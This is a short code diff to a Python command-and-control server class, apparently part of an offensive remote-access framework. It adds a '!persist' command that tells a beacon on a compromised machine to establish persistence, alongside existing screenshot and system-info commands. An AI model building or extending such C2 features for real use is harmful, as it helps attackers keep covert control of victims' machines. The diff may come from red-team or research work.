@@ -376,6 +376,11 @@ class C2Server:
                     self.send_command(session_id, "!screenshot")
                     time.sleep(1)  # Give time for screenshot capture
                     continue
+                elif command == '!persist':
+                    # Establish persistence on beacon
+                    self.send_command(session_id, "!persist")
+                    time.sleep(1)
+                    continue
                 elif command == '!sysinfo':
                     # Send system info command
                     self.send_command(session_id, "!sysinfo")
